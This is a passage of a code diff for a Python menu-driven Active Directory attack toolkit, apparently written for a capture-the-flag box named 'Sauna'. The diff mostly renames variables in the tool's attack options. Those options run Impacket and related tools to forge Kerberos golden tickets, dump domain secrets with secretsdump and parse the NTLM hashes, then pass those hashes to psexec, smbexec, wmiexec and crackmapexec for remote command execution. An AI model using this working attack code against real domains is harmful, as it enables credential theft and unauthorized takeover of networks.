+      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
       HASH = "................................"
       for x in range (0, MAX):
-         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
+         if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
       if HASH[:1] != ".":
-         command(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + POR.rstrip(" "))
-         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
-      if os.path.exists(POR.rstrip(" ") + ".ccache"):
-         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + DOMS.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + IMP.rstrip(" "))
+         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
+      if os.path.exists(IMP.rstrip(" ") + ".ccache"):
+         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
          print("Golden TGT was not generated...")
       prompt()
@@ -1443,21 +1413,21 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
       print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
-      command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + HST.rstrip(" "))
-      print("\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n")
+      command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + DOM.rstrip(" "))
+      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
       HASH = "................................"
       for x in range (0, MAX):
-         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
+         if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
       if HASH[:1] != ".":
-         command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" "))
+         command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" "))
       else:
          print("Hash value was not found...")
       prompt()
@@ -1465,13 +1435,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='51':
-      command("ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+      command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
       print("\n[+] Checking downloaded files: \n")
       command("ls -la ./" + DIR.rstrip(" "))
       prompt()
@@ -1479,7 +1449,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - BLOODHOUND STUFF!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1491,27 +1461,27 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + HST.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
+      command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
-      print("\n[+] Please wait...\n")
+      print("\n[*] Please wait...")
       os.remove("SECRETS.tmp")
-      command(PRO + "secretsdump.py " + PAS.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
+      command(PATH + "secretsdump.py " + PAS.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
 #     command("cat SECRETS.tmp")
       command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
       os.remove("SECRETS2.tmp")
@@ -1522,49 +1492,45 @@ while True:
       for x in range(0, count2):
          data = linecache.getline("SECRETS.tmp",x+1)
          data = data.replace(":::","")
-         temp = PAS.rstrip(" ") + "\\"	# HST
+         temp = PAS.rstrip(" ") + "\\"	# DOM
          data = data.replace(temp,"")
-         get1,get2,get3,get4 = data.split(":")
- 
+         get1,get2,get3,get4 = data.split(":") 
          get1 = get1.rstrip("\n")
          get4 = get4.rstrip("\n")
-         print("Found User ", get1, "\t using hash password ",get4, "...")
-
+         print("[-] Found User ", get1)
          if len(get1) < COL3:
             get1 = padding(get1,COL3) 			# USER
          if len(get4) < COL4:
             get4 = padding(get4,COL4) 			# PASSWORD
-
          for y in range (0, MAX):
             if US[y] == get1:				# MATCH USER
                PA[y] = get4				# MATCH PASSWORD 
-
       for z in range(0, MAX):
          if US[z].rstrip(" ") == USR.rstrip(" "):	# CURRENT USER
-            FRST = PA[z]				# DISPLAY HASH 
+            NTLM = PA[z]				# DISPLAY HASH 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - crackmapexec smb IP -u IMPERSONATE -H HASH -x 'net user Administrator /domain' --exec=method smbexec
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
       if (USR[:1] != "\""):# & (PAS[:1] != "\""):
-         print("\n[-]Trying user " + USR.rstrip(" ") + " with password " + HST.rstrip(" ") + "...\n")
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --shares ")
-         print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
+         print("\n[-]Trying user " + USR.rstrip(" ") + " with password " + DOM.rstrip(" ") + "...\n")
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --shares ")
+         print("\n[-]Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
          HASH = " "
          for x in range (0, MAX):
-            if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
+            if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
                HASH = PA[x].rstrip(" ")                 # GET HASH
          if HASH[:1] != " ":
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + POR.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain' --exec-method smbexec")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain' --exec-method smbexec")
          else:
-            print("No hash value was found for user " + POR.rstrip(" ") + "...")
+            print("No hash value was found for user " + IMP.rstrip(" ") + "...")
       else:
          print("Username or password not found...")
       prompt()
@@ -1572,80 +1538,80 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTLM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='56':
-      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n")
-      command(PRO + "psexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
-      print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
+      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTLM.rstrip("\n") + "...\n")
+      command(PATH + "psexec.py -hashes :" + NTLM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      print("\n[-]Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
       HASH = "................................"
       for x in range (0,MAX):
-         if US[x].rstrip(" ") == POR.rstrip(" "):
+         if US[x].rstrip(" ") == IMP.rstrip(" "):
             HASH = PA[x].rstrip(" ")
       if HASH[:1] != ".":
-         command(PRO + "psexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))     
+         command(PATH + "psexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))     
       else:
-         print("No hash value was found for user " + POR.rstrip(" ") + "...")
+         print("No hash value was found for user " + IMP.rstrip(" ") + "...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTLM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
-      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n")
-      command(PRO + "smbexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
-      print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
+      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTLM.rstrip("\n") + "...\n")
+      command(PATH + "smbexec.py -hashes :" + NTLM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      print("\n[-]Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
       HASH = "................................"
       for x in range (0,MAX):
-         if US[x].rstrip(" ") == POR.rstrip(" "):
+         if US[x].rstrip(" ") == IMP.rstrip(" "):
             HASH = PA[x].rstrip(" ")
       if HASH[:1] != ".":
-         command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))
+         command(PATH + "smbexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
       else:
-         print("No hash value was found for user " + POR.rstrip(" ") + "...")
+         print("No hash value was found for user " + IMP.rstrip(" ") + "...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTLM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='58':
-      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n")
-      command(PRO + "wmiexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
-      print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
+      print("\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTLM.rstrip("\n") + "...\n")
+      command(PATH + "wmiexec.py -hashes :" + NTLM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      print("\n[-]Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
       HASH = "................................"
       for x in range (0,MAX):
-         if US[x].rstrip(" ") == POR.rstrip(" "):
+         if US[x].rstrip(" ") == IMP.rstrip(" "):
             HASH = PA[x].rstrip(" ")
       if HASH[:1] != ".":
-         command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))   
+         command(PATH + "smbexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))   
       else:
-         print("No hash value was found for user " + POR.rstrip(" ") + "...")
+         print("No hash value was found for user " + IMP.rstrip(" ") + "...")
       prompt()     
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='59':
       command("cewl -d 3 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
-      print("\n[+] Userlist generated via website...")
+      print("\n[-] Userlist generated via website...")
       for x in range (0,MAX):
          US[x] = linecache.getline("users.txt", x+1)
          US[x] = US[x].rstrip(" ")
@@ -1653,7 +1619,7 @@ while True:
             US[x] = padding(US[x], COL3)
       if os.path.exists("/usr/share/ncrack/minimal.usr"):
          command("cat /usr/share/ncrack/minimal.usr >> users.txt 2>&1")
-         print("[+] NCrack minimal.usr list added as well...")
+         print("[-] NCrack minimal.usr list added as well...")
       if US[12] != "                          ":
          US[11] = "Some users are not shown!!"
       prompt()
@@ -1661,7 +1627,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - pftb IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1673,7 +1639,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - ssh -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1685,7 +1651,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - telnet -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1697,7 +1663,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - nc -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1709,7 +1675,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Windows remote login on port 5985.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1721,7 +1687,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - rdesktop - u user -p password -d domain / IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1733,7 +1699,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1744,18 +1710,19 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='68':
-      exit(1)              
+      exit(1)
+ 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - 
+# Version : Sauna
+# Details : Menu option selected - Nano or any editor
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
